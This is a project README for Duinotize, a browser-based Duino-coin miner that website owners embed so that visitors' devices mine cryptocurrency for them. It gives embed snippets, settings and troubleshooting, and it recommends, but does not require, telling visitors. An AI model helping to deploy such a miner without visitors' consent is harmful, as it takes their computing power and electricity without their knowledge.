# Duinotize
_Duino-coin webminer/website monetizer_

Tired of showing users ads? Don't want to leak personal info to use Adsense? Use **Duinotize**! It's a fork of the official Duino-coin web miner designed to be easily integrated into any website, to generate passive income just from people visiting your website.

## Installation
Include the main script in your head element:
```html
<script src="https://mobilegmyt.github.io/Duinotize/duinotize.js" defer></script>
```

Next make a script element add pass it an options object:
```html
<script>
  Duinotize({
    username: "rpinews",
    rigid: "GameSite"
  });
</script>
```

Make sure to replace `rpinews` with your username and `rigid` with the name you want miners to show up as in the web wallet.

<details><summary>Optional configs</summary>
These are configurations you can change if you wish, but the script will run fine if you don't use them
- `difficulty` variable with a mining difficulty of either "LOW", "MEDIUM", or "EXTREME" (LOW is the default, as MEDIUM or EXTREME causes frequent socket disconnects and may get your account banned!)
- `threads` variable, to choose how many threads the miner uses. Anything over 1 could cause lag on some devices, and even prevent the website from loading on them
- `hasher` variable, to choose which hasher to use. You can choose `DUCO-S1` or `hashwasm`. `hashwasm` has a extremely low hashrate on some devices, but a very high hashrate on others. `DUCO-S1` is the default hasher.

For example, a custom config might look like this:
```html
<script src="https://mobilegmyt.github.io/Duinotize/duinotize.js" defer></script>
<script>
  Duinotize({
    username: "rpinews",
    rigid: "GameSite",
    difficulty: "LOW",
    threads: 2,
    hasher: "hashwasm"
  });
</script>
```
</details>

Now, whenever that page is opened, the miner will start and output messages to the developer console. It will run until the tab (not just the page) is closed. Make sure to install the miner on a page where users visit the most, so that there are more miners running. You can see this in action at https://mobilegmyt.github.io/Duinotize/demo/, or look [here](https://github.com/mobilegmYT/Duinotize/blob/main/demo/index.html) for the source code to that page for a example of how to implement it.

I HIGHLY reccomend you put a note somewhere on your website to tell visiters that there is a crypto miner running in the background (in some places it is illegal to mine crypto in the background without consent!), and optionally credit this repo.

## Troubleshooting
- The script isn't running for some users!
- - That user could have some browser extension which blocks service workers --> Get them to disable the entension on your site 
- - Their browser blocks external javascript files from being run -> Copy this repo as a folder to your site root and point the script URL to that file (eg. `<script src="scripts/duinotize/duinotize.js" defer></script>`)
    
## How it works
The program runs a wrapper, which parses the input and runs a worker that connects to the Duco server via a websocket, requests a mining job with the configured settings and solves it using either [DUCO-S1](https://github.com/mobilegmYT/Duinotize/blob/main/hashes.js) or [hash-wasm](https://github.com/Daninet/hash-wasm).The miner sends the result, the time it took, username and hashrate to the server which loads it onto your wallet.

## Credits
This project is a fork/continuation of https://github.com/VatsaDev/Mineuino as the original author seems to have abandoned it and the code is broken.
Thanks to LDarki from the Duino discord for helping with some of the code.

## Notes
- I made this in just 2 hours at 1AM, so if there are bugs PLEASE report them
- I also have never touched JS before, so if there are improvements that could be made to the code, please PR them in.
